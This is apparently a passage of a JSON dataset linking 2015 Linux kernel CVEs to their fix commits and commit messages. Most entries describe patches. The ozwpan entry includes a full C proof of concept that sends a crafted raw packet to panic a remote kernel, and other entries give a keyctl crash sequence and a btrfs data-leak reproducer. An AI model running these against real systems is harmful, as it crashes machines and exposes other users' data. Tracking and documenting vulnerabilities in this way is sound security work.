+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=04bf464a5dfd9ade0dda918e44366c2c61fce80b",
+        "title": "ozwpan: divide-by-zero leading to panic",
+        "description": "A network supplied parameter was not checked before division, leading to a divide-by-zero. Since this happens in the softirq path, it leads to a crash. A PoC follows below, which requires the ozprotocol.h file from this module. =-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\" static int hex2num(char c) { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { int i; for (i = 0; i < 6; i++) { int a, b; a = hex2num(*txt++); if (a < 0) return -1; b = hex2num(*txt++); if (b < 0) return -1; *addr++ = (a << 4) | b; if (i < 5 && *txt++ != ':') return -1; } return 0; } int main(int argc, char *argv[]) { if (argc < 3) { fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]); return 1; } uint8_t dest_mac[6]; if (hwaddr_aton(argv[2], dest_mac)) { fprintf(stderr, \"Invalid mac address.\\n\"); return 1; } int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); if (sockfd < 0) { perror(\"socket\"); return 1; } struct ifreq if_idx; int interface_index; strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { perror(\"SIOCGIFINDEX\"); return 1; } interface_index = if_idx.ifr_ifindex; if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { perror(\"SIOCGIFHWADDR\"); return 1; } uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data; struct { struct ether_header ether_header; struct oz_hdr oz_hdr; struct oz_elt oz_elt; struct oz_elt_connect_req oz_elt_connect_req; struct oz_elt oz_elt2; struct oz_multiple_fixed oz_multiple_fixed; } __packed packet = { .ether_header = { .ether_type = htons(OZ_ETHERTYPE), .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }, .oz_hdr = { .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), .last_pkt_num = 0, .pkt_num = htole32(0) }, .oz_elt = { .type = OZ_ELT_CONNECT_REQ, .length = sizeof(struct oz_elt_connect_req) }, .oz_elt_connect_req = { .mode = 0, .resv1 = {0}, .pd_info = 0, .session_id = 0, .presleep = 0, .ms_isoc_latency = 0, .host_vendor = 0, .keep_alive = 0, .apps = htole16((1 << OZ_APPID_USB) | 0x1), .max_len_div16 = 0, .ms_per_isoc = 0, .up_audio_buf = 0, .ms_per_elt = 0 }, .oz_elt2 = { .type = OZ_ELT_APP_DATA, .length = sizeof(struct oz_multiple_fixed) }, .oz_multiple_fixed = { .app_id = OZ_APPID_USB, .elt_seq_num = 0, .type = OZ_USB_ENDPOINT_DATA, .endpoint = 0, .format = OZ_DATA_F_MULTIPLE_FIXED, .unit_size = 0, .data = {0} } }; struct sockaddr_ll socket_address = { .sll_ifindex = interface_index, .sll_halen = ETH_ALEN, .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } }; if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { perror(\"sendto\"); return 1; } return 0; } Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      }
+    ],
+    "CVE-2015-4036": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=59c816c1f24df0204e01851431d3bab3eb76719c",
+        "title": "vhost/scsi: potential memory corruption",
+        "description": "This code in vhost_scsi_make_tpg() is confusing because we limit \"tpgt\" to UINT_MAX but the data type of \"tpg->tport_tpgt\" and that is a u16. I looked at the context and it turns out that in vhost_scsi_set_endpoint(), \"tpg->tport_tpgt\" is used as an offset into the vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so anything higher than 255 then it is invalid. I have made that the limit now. In vhost_scsi_send_evt() we mask away values higher than 255, but now that the limit has changed, we don't need the mask. Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>"
+      }
+    ],
+    "CVE-2015-4167": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=23b133bdc452aa441fcb9b82cbf6dd05cfd342d0",
+        "title": "udf: Check length of extended attributes and allocation descriptors",
+        "description": "Check length of extended attributes and allocation descriptors when loading inodes from disk. Otherwise corrupted filesystems could confuse the code and make the kernel oops. Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>"
+      }
+    ],
+    "CVE-2015-4176": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=e0c9c0afd2fc958ffa34b697972721d81df8a56f",
+        "title": "mnt: Update detach_mounts to leave mounts connected",
+        "description": "Now that it is possible to lazily unmount an entire mount tree and leave the individual mounts connected to each other add a new flag UMOUNT_CONNECTED to umount_tree to force this behavior and use this flag in detach_mounts. This closes a bug where the deletion of a file or directory could trigger an unmount and reveal data under a mount point. Cc: stable@vger.kernel.org Signed-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>"
+      }
+    ],
+    "CVE-2015-5156": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39",
+        "title": "virtio-net: drop NETIF_F_FRAGLIST",
+        "description": "virtio declares support for NETIF_F_FRAGLIST, but assumes that there are at most MAX_SKB_FRAGS + 2 fragments which isn't always true with a fraglist. A longer fraglist in the skb will make the call to skb_to_sgvec overflow the sg array, leading to memory corruption. Drop NETIF_F_FRAGLIST so we only get what we can handle. Cc: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Jason Wang <jasowang@redhat.com> Acked-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-5157": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=9b6e6a8334d56354853f9c255d1395c2ba570e0a",
+        "title": "x86/nmi/64: Switch stacks on userspace NMI entry",
+        "description": "Returning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET. The NMI nesting fixup relies on a precise stack layout and atomic IRET. Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack. This will make some nested NMIs visible to C code, but the C code is okay with that. As a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode. Signed-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>"
+      }
+    ],
+    "CVE-2015-5283": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4",
+        "title": "sctp: fix race on protocol/netns initialization",
+        "description": "Consider sctp module is unloaded and is being requested because an user is creating a sctp socket. During initialization, sctp will add the new protocol type and then initialize pernet subsys: status = sctp_v4_protosw_init(); if (status) goto err_protosw_init; status = sctp_v6_protosw_init(); if (status) goto err_v6_protosw_init; status = register_pernet_subsys(&sctp_net_ops); The problem is that after those calls to sctp_v{4,6}_protosw_init(), it is possible for userspace to create SCTP sockets like if the module is already fully loaded. If that happens, one of the possible effects is that we will have readers for net->sctp.local_addr_list list earlier than expected and sctp_net_init() does not take precautions while dealing with that list, leading to a potential panic but not limited to that, as sctp_sock_init() will copy a bunch of blank/partially initialized values from net->sctp. The race happens like this: CPU 0 | CPU 1 socket() | __sock_create | socket() inet_create | __sock_create list_for_each_entry_rcu( | answer, &inetsw[sock->type], | list) { | inet_create /* no hits */ | if (unlikely(err)) { | ... | request_module() | /* socket creation is blocked | * the module is fully loaded | */ | sctp_init | sctp_v4_protosw_init | inet_register_protosw | list_add_rcu(&p->list, | last_perm); | | list_for_each_entry_rcu( | answer, &inetsw[sock->type], sctp_v6_protosw_init | list) { | /* hit, so assumes protocol | * is already loaded | */ | /* socket creation continues | * before netns is initialized | */ register_pernet_subsys | Simply inverting the initialization order between register_pernet_subsys() and sctp_v4_protosw_init() is not possible because register_pernet_subsys() will create a control sctp socket, so the protocol must be already visible by then. Deferring the socket creation to a work-queue is not good specially because we loose the ability to handle its errors. So, as suggested by Vlad, the fix is to split netns initialization in two moments: defaults and control socket, so that the defaults are already loaded by when we register the protocol, while control socket initialization is kept at the same moment it is today. Fixes: 4db67e808640 (\"sctp: Make the address lists per network namespace\") Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-5307": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=54a20552e1eae07aa240fa370a0293e006b5faed",
+        "title": "KVM: x86: work around infinite loop in microcode when #AC is delivered",
+        "description": "It was found that a guest can DoS a host by triggering an infinite stream of \"alignment check\" (#AC) exceptions. This causes the microcode to enter an infinite loop where the core never receives another interrupt. The host kernel panics pretty quickly due to the effects (CVE-2015-5307). Signed-off-by: Eric Northup <digitaleric@google.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
+      }
+    ],
+    "CVE-2015-5327": [
+      {
+        "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cc25b994acfbc901429da682d0f73c190e960206",
+        "title": "X.509: Fix the time validation [ver #2]",
+        "description": "This fixes CVE-2015-5327. It affects kernels from 4.3-rc1 onwards. Fix the X.509 time validation to use month number-1 when looking up the number of days in that month. Also put the month number validation before doing the lookup so as not to risk overrunning the array. This can be tested by doing the following: cat <<EOF | openssl x509 -outform DER | keyctl padd asymmetric \"\" @s -----BEGIN CERTIFICATE----- MIIDbjCCAlagAwIBAgIJAN/lUld+VR4hMA0GCSqGSIb3DQEBCwUAMCkxETAPBgNV BAoMCGxvY2FsLWNhMRQwEgYDVQQDDAtzaWduaW5nIGtleTAeFw0xNTA5MDEyMTMw MThaFw0xNjA4MzEyMTMwMThaMCkxETAPBgNVBAoMCGxvY2FsLWNhMRQwEgYDVQQD DAtzaWduaW5nIGtleTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANrn crcMfMeG67nagX4+m02Xk9rkmsMKI5XTUxbikROe7GSUVJ27sPVPZp4mgzoWlvhh jfK8CC/qhEhwep8Pgg4EJZyWOjhZb7R97ckGvLIoUC6IO3FC2ZnR7WtmWDgo2Jcj VlXwJdHhKU1VZwulh81O61N8IBKqz2r/kDhIWiicUCUkI/Do/RMRfKAoDBcSh86m gOeIAGfq62vbiZhVsX5dOE8Oo2TK5weAvwUIOR7OuGBl5AqwFlPnXQolewiHzKry THg9e44HfzG4Mi6wUvcJxVaQT1h5SrKD779Z5+8+wf1JLaooetcEUArvWyuxCU59 qxA4lsTjBwl4cmEki+cCAwEAAaOBmDCBlTAMBgNVHRMEBTADAQH/MAsGA1UdDwQE AwIHgDAdBgNVHQ4EFgQUyND/eKUis7ep/hXMJ8iZMdUhI+IwWQYDVR0jBFIwUIAU yND/eKUis7ep/hXMJ8iZMdUhI+KhLaQrMCkxETAPBgNVBAoMCGxvY2FsLWNhMRQw EgYDVQQDDAtzaWduaW5nIGtleYIJAN/lUld+VR4hMA0GCSqGSIb3DQEBCwUAA4IB AQAMqm1N1yD5pimUELLhT5eO2lRdGUfTozljRxc7e2QT3RLk2TtGhg65JFFN6eml XS58AEPVcAsSLDlR6WpOpOLB2giM0+fV/eYFHHmh22yqTJl4YgkdUwyzPdCHNOZL hmSKeY9xliHb6PNrNWWtZwhYYvRaO2DX4GXOMR0Oa2O4vaYu6/qGlZOZv3U6qZLY wwHEJSrqeBDyMuwN+eANHpoSpiBzD77S4e+7hUDJnql4j6xzJ65+nWJ89fCrQypR 4sN5R3aGeIh3QAQUIKpHilwek0CtEaYERgc5m+jGyKSc1rezJW62hWRTaitOc+d5 G5hh+9YpnYcxQHEKnZ7rFNKJ -----END CERTIFICATE----- EOF If it works, it emit a key ID; if it fails, it should give a bad message error. Reported-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Acked-by: David Woodhouse <David.Woodhouse@intel.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
+      }
+    ],
+    "CVE-2015-5364": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=beb39db59d14990e401e235faf66a6b9b31240b0",
+        "title": "udp: fix behavior of wrong checksums",
+        "description": "We have two problems in UDP stack related to bogus checksums : 1) We return -EAGAIN to application even if receive queue is not empty. This breaks applications using edge trigger epoll() 2) Under UDP flood, we can loop forever without yielding to other processes, potentially hanging the host, especially on non SMP. This patch is an attempt to make things better. We might in the future add extra support for rt applications wanting to better control time spent doing a recv() in a hostile environment. For example we could validate checksums before queuing packets in socket receive queue. Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-5366": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=beb39db59d14990e401e235faf66a6b9b31240b0",
+        "title": "udp: fix behavior of wrong checksums",
+        "description": "We have two problems in UDP stack related to bogus checksums : 1) We return -EAGAIN to application even if receive queue is not empty. This breaks applications using edge trigger epoll() 2) Under UDP flood, we can loop forever without yielding to other processes, potentially hanging the host, especially on non SMP. This patch is an attempt to make things better. We might in the future add extra support for rt applications wanting to better control time spent doing a recv() in a hostile environment. For example we could validate checksums before queuing packets in socket receive queue. Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-5697": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=b6878d9e03043695dbf3fa1caa6dfc09db225b16",
+        "title": "md: use kzalloc() when bitmap is disabled",
+        "description": "In drivers/md/md.c get_bitmap_file() uses kmalloc() for creating a mdu_bitmap_file_t called \"file\". 5769 file = kmalloc(sizeof(*file), GFP_NOIO); 5770 if (!file) 5771 return -ENOMEM; This structure is copied to user space at the end of the function. 5786 if (err == 0 && 5787 copy_to_user(arg, file, sizeof(*file))) 5788 err = -EFAULT But if bitmap is disabled only the first byte of \"file\" is initialized with zero, so it's possible to read some bytes (up to 4095) of kernel space memory from user space. This is an information leak. 5775 /* bitmap disabled, zero the first byte and copy out */ 5776 if (!mddev->bitmap_info.file) 5777 file->pathname[0] = '\\0'; Signed-off-by: Benjamin Randazzo <benjamin@randazzo.fr> Signed-off-by: NeilBrown <neilb@suse.com>"
+      }
+    ],
+    "CVE-2015-5706": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=f15133df088ecadd141ea1907f2c96df67c729f0",
+        "title": "path_openat(): fix double fput()",
+        "description": "path_openat() jumps to the wrong place after do_tmpfile() - it has already done path_cleanup() (as part of path_lookupat() called by do_tmpfile()), so doing that again can lead to double fput(). Cc: stable@vger.kernel.org # v3.11+ Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
+      }
+    ],
+    "CVE-2015-5707": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=fdc81f45e9f57858da6351836507fbcf1b7583ee",
+        "title": "sg_start_req(): use import_iovec()",
+        "description": "Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
+      },
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=451a2886b6bf90e2fb378f7c46c655450fb96e81",
+        "title": "sg_start_req(): make sure that there's not too many elements in iovec",
+        "description": "unfortunately, allowing an arbitrary 16bit value means a possibility of overflow in the calculation of total number of pages in bio_map_user_iov() - we rely on there being no more than PAGE_SIZE members of sum in the first loop there. If that sum wraps around, we end up allocating too small array of pointers to pages and it's easy to overflow it in the second loop. X-Coverup: TINC (and there's no lumber cartel either) Cc: stable@vger.kernel.org # way, way back Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
+      }
+    ],
+    "CVE-2015-6252": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5",
+        "title": "vhost: actually track log eventfd file",
+        "description": "While reviewing vhost log code, I found out that log_file is never set. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet). Cc: stable@vger.kernel.org Signed-off-by: Marc-André Lureau <marcandre.lureau@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>"
+      }
+    ],
+    "CVE-2015-6526": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=9a5cbce421a283e6aea3c4007f141735bf9da8c3",
+        "title": "powerpc/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH",
+        "description": "We cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH (currently 127), but we forgot to do the same for 64bit backtraces. Cc: stable@vger.kernel.org Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
+      }
+    ],
+    "CVE-2015-7509": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=c9b92530a723ac5ef8e352885a1862b18f31b2f5",
+        "title": "ext4: make orphan functions be no-op in no-journal mode",
+        "description": "Instead of checking whether the handle is valid, we check if journal is enabled. This avoids taking the s_orphan_lock mutex in all cases when there is no journal in use, including the error paths where ext4_orphan_del() is called with a handle set to NULL. Signed-off-by: Anatol Pomozov <anatol.pomozov@gmail.com> Signed-off-by: \"Theodore Ts'o\" <tytso@mit.edu>"
+      }
+    ],
+    "CVE-2015-7872": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce1fad2740c648a4340f6f6c391a8a83769d2e8c",
+        "title": "Merge branch 'keys-fixes' of git://git.kernel.org/pub/scm/linux/kernel/git/dhowells/linux-fs",
+        "description": "Pull key handling fixes from David Howells: \"Here are two patches, the first of which at least should go upstream immediately: (1) Prevent a user-triggerable crash in the keyrings destructor when a negatively instantiated keyring is garbage collected. I have also seen this triggered for user type keys. (2) Prevent the user from using requesting that a keyring be created and instantiated through an upcall. Doing so is probably safe since the keyring type ignores the arguments to its instantiation function - but we probably shouldn't let keyrings be created in this manner\" * 'keys-fixes' of git://git.kernel.org/pub/scm/linux/kernel/git/dhowells/linux-fs: KEYS: Don't permit request_key() to construct a new keyring KEYS: Fix crash when attempt to garbage collect an uninstantiated keyring"
+      },
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61",
+        "title": "KEYS: Fix crash when attempt to garbage collect an uninstantiated keyring",
+        "description": "The following sequence of commands: i=`keyctl add user a a @s` keyctl request2 keyring foo bar @t keyctl unlink $i @s tries to invoke an upcall to instantiate a keyring if one doesn't already exist by that name within the user's keyring set. However, if the upcall fails, the code sets keyring->type_data.reject_error to -ENOKEY or some other error code. When the key is garbage collected, the key destroy function is called unconditionally and keyring_destroy() uses list_empty() on keyring->type_data.link - which is in a union with reject_error. Subsequently, the kernel tries to unlink the keyring from the keyring names list - which oopses like this: BUG: unable to handle kernel paging request at 00000000ffffff8a IP: [<ffffffff8126e051>] keyring_destroy+0x3d/0x88 ... Workqueue: events key_garbage_collector ... RIP: 0010:[<ffffffff8126e051>] keyring_destroy+0x3d/0x88 RSP: 0018:ffff88003e2f3d30 EFLAGS: 00010203 RAX: 00000000ffffff82 RBX: ffff88003bf1a900 RCX: 0000000000000000 RDX: 0000000000000000 RSI: 000000003bfc6901 RDI: ffffffff81a73a40 RBP: ffff88003e2f3d38 R08: 0000000000000152 R09: 0000000000000000 R10: ffff88003e2f3c18 R11: 000000000000865b R12: ffff88003bf1a900 R13: 0000000000000000 R14: ffff88003bf1a908 R15: ffff88003e2f4000 ... CR2: 00000000ffffff8a CR3: 000000003e3ec000 CR4: 00000000000006f0 ... Call Trace: [<ffffffff8126c756>] key_gc_unused_keys.constprop.1+0x5d/0x10f [<ffffffff8126ca71>] key_garbage_collector+0x1fa/0x351 [<ffffffff8105ec9b>] process_one_work+0x28e/0x547 [<ffffffff8105fd17>] worker_thread+0x26e/0x361 [<ffffffff8105faa9>] ? rescuer_thread+0x2a8/0x2a8 [<ffffffff810648ad>] kthread+0xf3/0xfb [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2 [<ffffffff815f2ccf>] ret_from_fork+0x3f/0x70 [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2 Note the value in RAX. This is a 32-bit representation of -ENOKEY. The solution is to only call ->destroy() if the key was successfully instantiated. Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Dmitry Vyukov <dvyukov@google.com>"
+      }
+    ],
+    "CVE-2015-7884": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=eda98796aff0d9bf41094b06811f5def3b4c333c",
+        "title": "[media] media/vivid-osd: fix info leak in ioctl",
+        "description": "The vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of struct fb_vblank after the ->hcount member. Add an explicit memset(0) before filling the structure to avoid the info leak. Signed-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>"
+      }
+    ],
+    "CVE-2015-7885": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=4b6184336ebb5c8dc1eae7f7ab46ee608a748b05",
+        "title": "staging/dgnc: fix info leak in ioctl",
+        "description": "The dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of struct digi_dinfo after the ->dinfo_nboards member. Add an explicit memset(0) before filling the structure to avoid the info leak. Signed-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
+      }
+    ],
+    "CVE-2015-8104": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=cbdb967af3d54993f5814f1cee0ed311a055377d",
+        "title": "KVM: svm: unconditionally intercept #DB",
+        "description": "This is needed to avoid the possibility that the guest triggers an infinite stream of #DB exceptions (CVE-2015-8104). VMX is not affected: because it does not save DR6 in the VMCS, it already intercepts #DB unconditionally. Reported-by: Jan Beulich <jbeulich@suse.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
+      }
+    ],
+    "CVE-2015-8215": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=77751427a1ff25b27d47a4c36b12c3c8667855ac",
+        "title": "ipv6: addrconf: validate new MTU before applying it",
+        "description": "Currently we don't check if the new MTU is valid or not and this allows one to configure a smaller than minimum allowed by RFCs or even bigger than interface own MTU, which is a problem as it may lead to packet drops. If you have a daemon like NetworkManager running, this may be exploited by remote attackers by forging RA packets with an invalid MTU, possibly leading to a DoS. (NetworkManager currently only validates for values too small, but not for too big ones.) The fix is just to make sure the new value is valid. That is, between IPV6_MIN_MTU and interface's MTU. Note that similar check is already performed at ndisc_router_discovery(), for when kernel itself parses the RA. Signed-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com> Signed-off-by: Sabrina Dubroca <sd@queasysnail.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
+      }
+    ],
+    "CVE-2015-8374": [
+      {
+        "url": "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=0305cd5f7fca85dae392b9ba85b116896eb7c1c7",
+        "title": "Btrfs: fix truncation of compressed and inlined extents",
+        "description": "When truncating a file to a smaller size which consists of an inline extent that is compressed, we did not discard (or made unusable) the data between the new file size and the old file size, wasting metadata space and allowing for the truncated data to be leaked and the data corruption/loss mentioned below. We were also not correctly decrementing the number of bytes used by the inode, we were setting it to zero, giving a wrong report for callers of the stat(2) syscall. The fsck tool also reported an error about a mismatch between the nbytes of the file versus the real space used by the file. Now because we weren't discarding the truncated region of the file, it was possible for a caller of the clone ioctl to actually read the data that was truncated, allowing for a security breach without requiring root access to the system, using only standard filesystem operations. The scenario is the following: 1) User A creates a file which consists of an inline and compressed extent with a size of 2000 bytes - the file is not accessible to any other users (no read, write or execution permission for anyone else); 2) The user truncates the file to a size of 1000 bytes; 3) User A makes the file world readable; 4) User B creates a file consisting of an inline extent of 2000 bytes; 5) User B issues a clone operation from user A's file into its own file (using a length argument of 0, clone the whole range); 6) User B now gets to see the 1000 bytes that user A truncated from its file before it made its file world readbale. User B also lost the bytes in the range [1000, 2000[ bytes from its own file, but that might be ok if his/her intention was reading stale data from user A that was never supposed to be public. Note that this contrasts with the case where we truncate a file from 2000 bytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In this case reading any byte from the range [1000, 2000[ will return a value of 0x00, instead of the original data. This problem exists since the clone ioctl was added and happens both with and without my recent data loss and file corruption fixes for the clone ioctl (patch \"Btrfs: fix file corruption and data loss after cloning inline extents\"). So fix this by truncating the compressed inline extents as we do for the non-compressed case, which involves decompressing, if the data isn't already in the page cache, compressing the truncated version of the extent, writing the compressed content into the inline extent and then truncate it. The following test case for fstests reproduces the problem. In order for the test to pass both this fix and my previous fix for the clone ioctl that forbids cloning a smaller inline extent into a larger one, which is titled \"Btrfs: fix file corruption and data loss after cloning inline extents\", are needed. Without that other fix the test fails in a different way that does not leak the truncated data, instead part of destination file gets replaced with zeroes (because the destination file has a larger inline extent than the source). seq=`basename $0` seqres=$RESULT_DIR/$seq echo \"QA output created by $seq\" tmp=/tmp/$$ status=1 # failure is the default! trap \"_cleanup; exit \\$status\" 0 1 2 3 15 _cleanup() { rm -f $tmp.* } # get standard environment, filters and checks . ./common/rc . ./common/filter # real QA test starts here _need_to_be_root _supported_fs btrfs _supported_os Linux _require_scratch _require_cloner rm -f $seqres.full _scratch_mkfs >>$seqres.full 2>&1 _scratch_mount \"-o compress\" # Create our test files. File foo is going to be the source of a clone operation # and consists of a single inline extent with an uncompressed size of 512 bytes, # while file bar consists of a single inline extent with an uncompressed size of # 256 bytes. For our test's purpose, it's important that file bar has an inline # extent with a size smaller than foo's inline extent. $XFS_IO_PROG -f -c \"pwrite -S 0xa1 0 128\" \\ -c \"pwrite -S 0x2a 128 384\" \\ $SCRATCH_MNT/foo | _filter_xfs_io $XFS_IO_PROG -f -c \"pwrite -S 0xbb 0 256\" $SCRATCH_MNT/bar | _filter_xfs_io # Now durably persist all metadata and data. We do this to make sure that we get # on disk an inline extent with a size of 512 bytes for file foo. sync # Now truncate our file foo to a smaller size. Because it consists of a # compressed and inline extent, btrfs did not shrink the inline extent to the # new size (if the extent was not compressed, btrfs would shrink it to 128 # bytes), it only updates the inode's i_size to 128 bytes. $XFS_IO_PROG -c \"truncate 128\" $SCRATCH_MNT/foo # Now clone foo's inline extent into bar. # This clone operation should fail with errno EOPNOTSUPP because the source # file consists only of an inline extent and the file's size is smaller than # the inline extent of the destination (128 bytes < 256 bytes). However the # clone ioctl was not prepared to deal with a file that has a size smaller # than the size of its inline extent (something that happens only for compressed # inline extents), resulting in copying the full inline extent from the source # file into the destination file. # # Note that btrfs' clone operation for inline extents consists of removing the # inline extent from the destination inode and copy the inline extent from the # source inode into the destination inode, meaning that if the destination # inode's inline extent is larger (N bytes) than the source inode's inline # extent (M bytes), some bytes (N - M bytes) will be lost from the destination # file. Btrfs could copy the source inline extent's data into the destination's # inline extent so that we would not lose any data, but that's currently not # done due to the complexity that would be needed to deal with such cases # (specially when one or both extents are compressed), returning EOPNOTSUPP, as # it's normally not a very common case to clone very small files (only case # where we get inline extents) and copying inline extents does not save any # space (unlike for normal, non-inlined extents). $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT/foo $SCRATCH_MNT/bar # Now because the above clone operation used to succeed, and due to foo's inline # extent not being shinked by the truncate operation, our file bar got the whole # inline extent copied from foo, making us lose the last 128 bytes from bar # which got replaced by the bytes in range [128, 256[ from foo before foo was # truncated - in other words, data 